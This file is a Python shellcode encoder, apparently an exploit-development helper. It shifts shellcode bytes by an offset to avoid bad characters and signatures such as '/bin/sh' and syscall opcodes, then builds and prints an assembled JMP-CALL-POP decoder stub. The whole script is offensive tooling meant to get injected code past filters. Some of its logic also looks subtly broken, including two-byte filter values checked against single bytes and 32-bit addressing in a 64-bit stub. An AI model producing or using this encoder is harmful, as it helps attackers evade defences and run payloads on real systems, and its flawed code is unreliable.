#!/usr/bin/python3
import	sys
import	os
import	subprocess
from binascii import	unhexlify
from termcolor import	colored
from subprocess import	Popen, PIPE

filters = [0x08, 0x09, 0x0a, 0x0d, 0x20, 0x2f, 0x62, 0x69, 0x6e, 0x73, 0x68, 0x80cd, 0x050f, 0x340f]

if len(sys.argv) != 2:
	print(colored("Usage: encode <shellcode>", "red"))
	sys.exit(0)
shellcode = sys.argv[1]
shellcode_len = len(shellcode)

def	get_offset(shellcode, offset = 1):
	for s in shellcode:
		for c in filters:
			x = ord(s) + offset
			if x == c:
				return get_offset(shellcode, offset + 1)
	return offset

def	print_encoded(shellcode, offset):
	print(''.join([r'\x{:x}'.format(ord(c) + offset) for c in shellcode]))

def	print_decoder(shellcode, offset):
	f = open("decoder.asm", "w")
	f.write("""BITS 64
jmp short foo
bar:
	pop rsi
	xor rcx, rcx
	mov rcx, {}
decoder:
	sub byte [esi + ecx - 1], {}
	sub rcx, 1
	jnz decoder
	jmp short shellcode
foo:
	call bar
shellcode:
	""".format(shellcode_len, offset))
	f.close()
	os.system("nasm decoder.asm")
	result = subprocess.Popen(['xxd -ps decoder'], shell=True, stdout=subprocess.PIPE).communicate()[0]
	result = result.decode("utf-8").replace("\n", "")
	sys.stdout.write(r"\x" + r"\x".join(result[n : n+2] for n in range(0, len(result), 2)))

offset = get_offset(shellcode)
print_decoder(shellcode, offset)
print_encoded(shellcode, offset)
